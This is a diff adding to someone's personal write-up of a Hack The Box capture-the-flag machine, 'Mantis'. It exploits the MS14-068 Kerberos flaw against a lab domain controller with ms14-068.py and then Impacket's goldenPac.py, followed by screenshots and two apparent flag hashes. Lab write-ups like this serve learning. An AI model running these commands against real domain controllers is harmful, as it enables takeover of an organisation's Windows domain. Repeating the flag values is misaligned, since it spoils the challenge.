@@ -89,3 +89,27 @@ clone this repo
 python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
 ```
 
+Using this as i am getting error
+https://github.com/mubix/akb/blob/master/Impacket/MS14-068.md
+
+```
+cd /usr/share/doc/python3-impacket/examples
+```
+
+```
+goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james@mantis.htb.local
+```
+
+Finally it worked lesson learned when one things not work find another way
+![[Pasted image 20240516233757.png]]
+
+![[Pasted image 20240516233917.png]]
+
+```
+52a1b69bbae1e596f7bed80fd3f1c7ae
+```
+
+![[Pasted image 20240516234024.png]]
+```
+85c31d408625d8ff9308de9162f5706a
+```
